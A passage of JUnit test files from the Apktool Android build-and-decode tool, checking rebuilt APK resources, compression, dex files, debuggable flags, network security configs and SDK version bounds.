    public void confirmJsonFileIsDeflatedTest() throws BrutException, IOException {
        Integer control = sTestOrigDir.getDirectory().getCompressionLevel("test.json");
        Integer rebuilt = sTestNewDir.getDirectory().getCompressionLevel("test.json");

        assertEquals(control, rebuilt);
        assertEquals(Integer.valueOf(8), rebuilt);
    }

    @Test
    public void confirmPngFileIsCorrectlyDeflatedTest() throws BrutException, IOException {
        Integer control = sTestOrigDir.getDirectory().getCompressionLevel("950x150.png");
        Integer rebuilt = sTestNewDir.getDirectory().getCompressionLevel("950x150.png");

        assertEquals(control, rebuilt);
        assertEquals(Integer.valueOf(8), rebuilt);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt2/BuildAndDecodeTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt2;

import brut.androlib.*;
import brut.androlib.meta.MetaInfo;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.*;

public class BuildAndDecodeTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();

        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "testapp-orig");
        sTestNewDir = new ExtFile(sTmpDir, "testapp-new");
        LOGGER.info("Unpacking testapp...");
        TestUtils.copyResourceDir(BuildAndDecodeTest.class, "aapt2/testapp/", sTestOrigDir);

        BuildOptions buildOptions = new BuildOptions();
        buildOptions.useAapt2 = true;
        buildOptions.verbose = true;

        LOGGER.info("Building testapp.apk...");
        File testApk = new File(sTmpDir, "testapp.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding testapp.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void valuesStringsTest() throws BrutException {
        compareValuesFiles("values/strings.xml");
    }

    @Test
    public void valuesMaxLengthTest() throws BrutException {
        compareValuesFiles("values-es/strings.xml");
    }

    @Test
    public void confirmZeroByteFileExtensionIsNotStored() throws BrutException {
        MetaInfo metaInfo = new Androlib().readMetaFile(sTestNewDir);
        assertFalse(metaInfo.doNotCompress.contains("jpg"));
    }

    @Test
    public void confirmZeroByteFileIsStored() throws BrutException {
        MetaInfo metaInfo = new Androlib().readMetaFile(sTestNewDir);
        assertTrue(metaInfo.doNotCompress.contains("assets/0byte_file.jpg"));
    }

    @Test
    public void navigationResourceTest() throws BrutException {
        compareXmlFiles("res/navigation/nav_graph.xml");
    }

    @Test
    public void xmlIdsEmptyTest() throws BrutException {
        compareXmlFiles("res/values/ids.xml");
    }

    @Test
    public void leadingDollarSignResourceNameTest() throws BrutException {
        compareXmlFiles("res/drawable/$avd_hide_password__0.xml");
        compareXmlFiles("res/drawable/$avd_show_password__0.xml");
        compareXmlFiles("res/drawable/$avd_show_password__1.xml");
        compareXmlFiles("res/drawable/$avd_show_password__2.xml");
        compareXmlFiles("res/drawable/avd_show_password.xml");
    }

    @Test
    public void samsungQmgFilesHandledTest() throws IOException, BrutException {
        compareBinaryFolder("drawable-xhdpi", true);
    }

    @Test
    public void confirmManifestStructureTest() throws BrutException {
        compareXmlFiles("AndroidManifest.xml");
    }

    @Test
    public void xmlXsdFileTest() throws BrutException {
        compareXmlFiles("res/xml/ww_box_styles_schema.xsd");
    }

    @Test
    public void multipleDexTest() throws BrutException, IOException {
        compareBinaryFolder("/smali_classes2", false);
        compareBinaryFolder("/smali_classes3", false);

        File classes2Dex = new File(sTestOrigDir, "build/apk/classes2.dex");
        File classes3Dex = new File(sTestOrigDir, "build/apk/classes3.dex");

        assertTrue(classes2Dex.isFile());
        assertTrue(classes3Dex.isFile());
    }

    @Test
    public void singleDexTest() throws BrutException, IOException {
        compareBinaryFolder("/smali", false);

        File classesDex = new File(sTestOrigDir, "build/apk/classes.dex");
        assertTrue(classesDex.isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt2/DebuggableFalseChangeToTrueTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt2;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.custommonkey.xmlunit.XMLUnit;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import org.xml.sax.SAXException;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;
import static org.junit.Assert.assertTrue;

public class DebuggableFalseChangeToTrueTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "issue2328-debuggable-false-orig");
        sTestNewDir = new ExtFile(sTmpDir, "issue2328-debuggable-flase-new");
        LOGGER.info("Unpacking issue2328-debuggable-flase...");
        TestUtils.copyResourceDir(DebuggableFalseChangeToTrueTest.class, "aapt2/issue2328/debuggable-false", sTestOrigDir);

        LOGGER.info("Building issue2328-debuggable-flase.apk...");
        BuildOptions buildOptions = new BuildOptions();
        buildOptions.debugMode = true;
        buildOptions.useAapt2 = true;
        buildOptions.verbose = true;

        File testApk = new File(sTmpDir, "issue2328-debuggable-flase.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding issue2328-debuggable-flase.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void DebugIsTruePriorToBeingFalseTest() throws IOException, SAXException {
        String apk = "issue2328-debuggable-flase-new";

        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?>" +
                "<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"23\" " +
                "android:compileSdkVersionCodename=\"6.0-2438415\" package=\"com.ibotpeaches.issue2328\" platformBuildVersionCode=\"23\" " +
                "platformBuildVersionName=\"6.0-2438415\">    <application android:debuggable=\"true\"/></manifest>");

        byte[] encoded = Files.readAllBytes(Paths.get(sTmpDir + File.separator + apk + File.separator + "AndroidManifest.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));

        XMLUnit.setIgnoreWhitespace(true);
        XMLUnit.setIgnoreAttributeOrder(true);
        XMLUnit.setCompareUnmatched(false);

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt2/DebuggableTrueAddedTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt2;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.custommonkey.xmlunit.XMLUnit;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import org.xml.sax.SAXException;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;
import static org.junit.Assert.assertTrue;

public class DebuggableTrueAddedTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "issue2328-debuggable-missing-orig");
        sTestNewDir = new ExtFile(sTmpDir, "issue2328-debuggable-missing-new");
        LOGGER.info("Unpacking issue2328-debuggable-missing...");
        TestUtils.copyResourceDir(DebuggableTrueAddedTest.class, "aapt2/issue2328/debuggable-missing", sTestOrigDir);

        LOGGER.info("Building issue2328-debuggable-missing.apk...");
        BuildOptions buildOptions = new BuildOptions();
        buildOptions.debugMode = true;
        buildOptions.useAapt2 = true;
        buildOptions.verbose = true;

        File testApk = new File(sTmpDir, "issue2328-debuggable-missing.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding issue2328-debuggable-missing.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void DebugIsTruePriorToBeingFalseTest() throws IOException, SAXException {
        String apk = "issue2328-debuggable-missing-new";

        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?>" +
                "<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"23\" " +
                "android:compileSdkVersionCodename=\"6.0-2438415\" package=\"com.ibotpeaches.issue2328\" platformBuildVersionCode=\"23\" " +
                "platformBuildVersionName=\"6.0-2438415\">    <application android:debuggable=\"true\"/></manifest>");

        byte[] encoded = Files.readAllBytes(Paths.get(sTmpDir + File.separator + apk + File.separator + "AndroidManifest.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));

        XMLUnit.setIgnoreWhitespace(true);
        XMLUnit.setIgnoreAttributeOrder(true);
        XMLUnit.setCompareUnmatched(false);

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt2/DebuggableTrueRetainedTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt2;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.custommonkey.xmlunit.XMLUnit;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import org.xml.sax.SAXException;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;
import static org.junit.Assert.assertTrue;

public class DebuggableTrueRetainedTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "issue2328-debuggable-true-orig");
        sTestNewDir = new ExtFile(sTmpDir, "issue2328-debuggable-true-new");
        LOGGER.info("Unpacking issue2328-debuggable-true...");
        TestUtils.copyResourceDir(DebuggableTrueRetainedTest.class, "aapt2/issue2328/debuggable-true", sTestOrigDir);

        LOGGER.info("Building issue2328-debuggable-true.apk...");
        BuildOptions buildOptions = new BuildOptions();
        buildOptions.debugMode = true;
        buildOptions.useAapt2 = true;
        buildOptions.verbose = true;

        File testApk = new File(sTmpDir, "issue2328-debuggable-true.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding issue2328-debuggable-true.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void DebugIsTruePriorToBeingFalseTest() throws IOException, SAXException {
        String apk = "issue2328-debuggable-true-new";

        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?>" +
                "<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"23\" " +
                "android:compileSdkVersionCodename=\"6.0-2438415\" package=\"com.ibotpeaches.issue2328\" platformBuildVersionCode=\"23\" " +
                "platformBuildVersionName=\"6.0-2438415\">    <application android:debuggable=\"true\"/></manifest>");

        byte[] encoded = Files.readAllBytes(Paths.get(sTmpDir + File.separator + apk + File.separator + "AndroidManifest.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));

        XMLUnit.setIgnoreWhitespace(true);
        XMLUnit.setIgnoreAttributeOrder(true);
        XMLUnit.setCompareUnmatched(false);

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt2/NetworkConfigTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt2;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.custommonkey.xmlunit.XMLUnit;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;
import static org.junit.Assert.*;

public class NetworkConfigTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();

        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "testapp-orig");
        sTestNewDir = new ExtFile(sTmpDir, "testapp-new");
        LOGGER.info("Unpacking testapp...");
        TestUtils.copyResourceDir(NetworkConfigTest.class, "aapt2/network_config/", sTestOrigDir);

        LOGGER.info("Building testapp.apk...");
        BuildOptions buildOptions = new BuildOptions();
        buildOptions.netSecConf = true;
        buildOptions.useAapt2 = true;
        File testApk = new File(sTmpDir, "testapp.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding testapp.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void netSecConfGeneric() throws IOException, SAXException {
        LOGGER.info("Comparing network security configuration file...");
        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>" +
            "<network-security-config><base-config><trust-anchors><certificates src=\"system\"/><certificates src=\"us" +
            "er\"/></trust-anchors></base-config></network-security-config>");

        byte[] encoded = Files.readAllBytes(Paths.get(String.valueOf(sTestNewDir), "res/xml/network_security_config.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));

        XMLUnit.setIgnoreWhitespace(true);
        XMLUnit.setIgnoreAttributeOrder(true);
        XMLUnit.setCompareUnmatched(false);

        assertXMLEqual(expected, obtained);
    }

    @Test
    public void netSecConfInManifest() throws IOException, ParserConfigurationException, SAXException {
        LOGGER.info("Validating network security config in Manifest...");
        Document doc = loadDocument(new File(sTestNewDir + "/AndroidManifest.xml"));
        Node application = doc.getElementsByTagName("application").item(0);
        NamedNodeMap attr = application.getAttributes();
        Node debugAttr = attr.getNamedItem("android:networkSecurityConfig");
        assertEquals("@xml/network_security_config", debugAttr.getNodeValue());
    }

    private static Document loadDocument(File file)
        throws IOException, SAXException, ParserConfigurationException {

        DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
        docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);
        docFactory.setFeature(FEATURE_LOAD_DTD, false);

        try {
            docFactory.setAttribute(ACCESS_EXTERNAL_DTD, " ");
            docFactory.setAttribute(ACCESS_EXTERNAL_SCHEMA, " ");
        } catch (IllegalArgumentException ex) {
            LOGGER.warning("JAXP 1.5 Support is required to validate XML");
        }

        DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
        try (FileInputStream inputStream = new FileInputStream(file)) {
            return docBuilder.parse(inputStream);
        }
    }

    private static final String ACCESS_EXTERNAL_DTD = "http://javax.xml.XMLConstants/property/accessExternalDTD";
    private static final String ACCESS_EXTERNAL_SCHEMA = "http://javax.xml.XMLConstants/property/accessExternalSchema";
    private static final String FEATURE_LOAD_DTD = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
    private static final String FEATURE_DISABLE_DOCTYPE_DECL = "http://apache.org/xml/features/disallow-doctype-decl";
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt2/NoNetworkConfigTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt2;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.custommonkey.xmlunit.XMLUnit;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;
import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

public class NoNetworkConfigTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();

        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "testapp-orig");
        sTestNewDir = new ExtFile(sTmpDir, "testapp-new");
        LOGGER.info("Unpacking testapp...");
        TestUtils.copyResourceDir(NoNetworkConfigTest.class, "aapt2/testapp/", sTestOrigDir);

        LOGGER.info("Building testapp.apk...");
        BuildOptions buildOptions = new BuildOptions();
        buildOptions.netSecConf = true;
        buildOptions.useAapt2 = true;
        File testApk = new File(sTmpDir, "testapp.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding testapp.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void netSecConfGeneric() throws IOException, SAXException {
        LOGGER.info("Comparing network security configuration file...");
        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>" +
            "<network-security-config><base-config><trust-anchors><certificates src=\"system\"/><certificates src=\"us" +
            "er\"/></trust-anchors></base-config></network-security-config>");

        byte[] encoded = Files.readAllBytes(Paths.get(String.valueOf(sTestNewDir), "res/xml/network_security_config.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));

        XMLUnit.setIgnoreWhitespace(true);
        XMLUnit.setIgnoreAttributeOrder(true);
        XMLUnit.setCompareUnmatched(false);

        assertXMLEqual(expected, obtained);
    }

    @Test
    public void netSecConfInManifest() throws IOException, ParserConfigurationException, SAXException {
        LOGGER.info("Validating network security config in Manifest...");
        Document doc = loadDocument(new File(sTestNewDir + "/AndroidManifest.xml"));
        Node application = doc.getElementsByTagName("application").item(0);
        NamedNodeMap attr = application.getAttributes();
        Node debugAttr = attr.getNamedItem("android:networkSecurityConfig");
        assertEquals("@xml/network_security_config", debugAttr.getNodeValue());
    }

    private static Document loadDocument(File file)
        throws IOException, SAXException, ParserConfigurationException {

        DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
        docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);
        docFactory.setFeature(FEATURE_LOAD_DTD, false);

        try {
            docFactory.setAttribute(ACCESS_EXTERNAL_DTD, " ");
            docFactory.setAttribute(ACCESS_EXTERNAL_SCHEMA, " ");
        } catch (IllegalArgumentException ex) {
            LOGGER.warning("JAXP 1.5 Support is required to validate XML");
        }

        DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
        // Not using the parse(File) method on purpose, so that we can control when
        // to close it. Somehow parse(File) does not seem to close the file in all cases.
        try (FileInputStream inputStream = new FileInputStream(file)) {
            return docBuilder.parse(inputStream);
        }
    }

    private static final String ACCESS_EXTERNAL_DTD = "http://javax.xml.XMLConstants/property/accessExternalDTD";
    private static final String ACCESS_EXTERNAL_SCHEMA = "http://javax.xml.XMLConstants/property/accessExternalSchema";
    private static final String FEATURE_LOAD_DTD = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
    private static final String FEATURE_DISABLE_DOCTYPE_DECL = "http://apache.org/xml/features/disallow-doctype-decl";
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt2/NonStandardPkgIdTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt2;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.androlib.res.data.ResTable;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;

import static org.junit.Assert.*;

public class NonStandardPkgIdTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();

        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTmpDir.deleteOnExit();

        sTestOrigDir = new ExtFile(sTmpDir, "pkgid8-orig");
        sTestNewDir = new ExtFile(sTmpDir, "pkgid8-new");
        LOGGER.info("Unpacking pkgid8...");
        TestUtils.copyResourceDir(BuildAndDecodeTest.class, "aapt2/pkgid8/", sTestOrigDir);

        BuildOptions buildOptions = new BuildOptions();
        buildOptions.useAapt2 = true;
        buildOptions.verbose = true;

        LOGGER.info("Building pkgid8.apk...");
        File testApk = new File(sTmpDir, "pkgid8.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding pkgid8.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
        mResTable = apkDecoder.getResTable();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void valuesStringsTest() throws BrutException {
        compareValuesFiles("values/strings.xml");
    }

    @Test
    public void confirmManifestStructureTest() throws BrutException {
        compareXmlFiles("AndroidManifest.xml");
    }

    @Test
    public void confirmResourcesAreFromPkgId8() throws AndrolibException {
        assertEquals(0x80, mResTable.getPackageId());

        assertEquals(0x80, mResTable.getResSpec(0x80020000).getPackage().getId());
        assertEquals(0x80, mResTable.getResSpec(0x80020001).getPackage().getId());
        assertEquals(0x80, mResTable.getResSpec(0x80030000).getPackage().getId());
    }

    private static ResTable mResTable;
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/androlib/InvalidSdkBoundingTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.androlib;

import brut.androlib.BaseTest;
import brut.androlib.res.AndrolibResources;
import org.junit.Test;
import java.util.LinkedHashMap;
import java.util.Map;
import static org.junit.Assert.assertEquals;

public class InvalidSdkBoundingTest extends BaseTest {

    @Test
    public void checkIfInvalidValuesPass() {
        AndrolibResources androlibResources = new AndrolibResources();

        Map<String, String> sdkInfo = new LinkedHashMap<>();
        sdkInfo.put("minSdkVersion", "15");
        sdkInfo.put("targetSdkVersion", "25");
        sdkInfo.put("maxSdkVersion", "19");

        androlibResources.setSdkInfo(sdkInfo);
        assertEquals("19", androlibResources.checkTargetSdkVersionBounds());
    }

    @Test
    public void checkIfMissingMinPasses() {
        AndrolibResources androlibResources = new AndrolibResources();

        Map<String, String> sdkInfo = new LinkedHashMap<>();
        sdkInfo.put("targetSdkVersion", "25");
        sdkInfo.put("maxSdkVersion", "19");

        androlibResources.setSdkInfo(sdkInfo);
        assertEquals("19", androlibResources.checkTargetSdkVersionBounds());
    }

    @Test
    public void checkIfMissingMaxPasses() {
        AndrolibResources androlibResources = new AndrolibResources();

        Map<String, String> sdkInfo = new LinkedHashMap<>();
        sdkInfo.put("minSdkVersion", "15");
        sdkInfo.put("targetSdkVersion", "25");

        androlibResources.setSdkInfo(sdkInfo);
        assertEquals("25", androlibResources.checkTargetSdkVersionBounds());
    }

    @Test
    public void checkIfMissingBothPasses() {
        AndrolibResources androlibResources = new AndrolibResources();

        Map<String, String> sdkInfo = new LinkedHashMap<>();
        sdkInfo.put("targetSdkVersion", "25");

        androlibResources.setSdkInfo(sdkInfo);
        assertEquals("25", androlibResources.checkTargetSdkVersionBounds());
    }

    @Test
    public void checkForShortHandSTag() {
        AndrolibResources androlibResources = new AndrolibResources();

        Map<String, String> sdkInfo = new LinkedHashMap<>();
        sdkInfo.put("targetSdkVersion", "S");

